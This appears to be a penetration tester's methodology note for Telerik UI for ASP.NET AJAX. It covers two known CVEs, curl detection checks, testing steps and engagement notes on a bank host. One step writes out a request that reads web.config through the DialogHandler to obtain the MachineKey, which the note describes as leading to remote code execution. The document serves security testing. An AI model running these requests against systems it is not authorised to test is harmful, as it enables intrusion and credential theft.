# Telerik UI for ASP.NET AJAX — Testing Methodology

## Known Vulnerabilities

### CVE-2019-18935 — Deserialization RCE
- **Affected:** Telerik UI before R3 2020 (2020.3.1021)
- **Vector:** `Telerik.Web.UI.WebResource.axd?type=rau`
- **Prerequisite:** MachineKey knowledge (from web.config leak)

### CVE-2020-1145 — File Read via DialogHandler
- **Affected:** All versions
- **Vector:** `Telerik.Web.UI.DialogHandler.aspx?dp=~/web.config`
- **Prerequisite:** None if handler not restricted

## Detection

```bash
# Check if handlers are registered
curl -sk "https://target/Telerik.Web.UI.WebResource.axd?type=rau"
# Vulnerable: "RadAsyncUpload handler is registered succesfully..."

curl -sk "https://target/Telerik.Web.UI.DialogHandler.aspx"
# Vulnerable: 200 with dialog HTML
```

## Testing Steps

1. Confirm handlers active (see Detection above)
2. Test CVE-2020-1145:
   ```bash
   curl -sk "https://target/Telerik.Web.UI.DialogHandler.aspx?dp=~/web.config"
   ```
   - 403 → restricted (not exploitable)
   - 200 with content → vulnerable
3. Test CVE-2019-18935: requires MachineKey from web.config
4. Version detection: check ScriptResource.axd for version strings

## Common Findings

| Finding | Severity | Notes |
|---------|----------|-------|
| Handlers active but restricted | Low | 403 on all exploit attempts |
| CVE-2020-1145 file read | Critical | Can read web.config → MachineKey |
| CVE-2019-18935 deserialization | Critical | Requires MachineKey → RCE |
| Outdated version | Medium | May have known CVEs |

## financial institution Notes (2026-05-26)
- Handlers active on www.example-bank.tld, all file-read attempts 403
- Version undetermined externally, no MachineKey leakage
- Not exploitable without further access
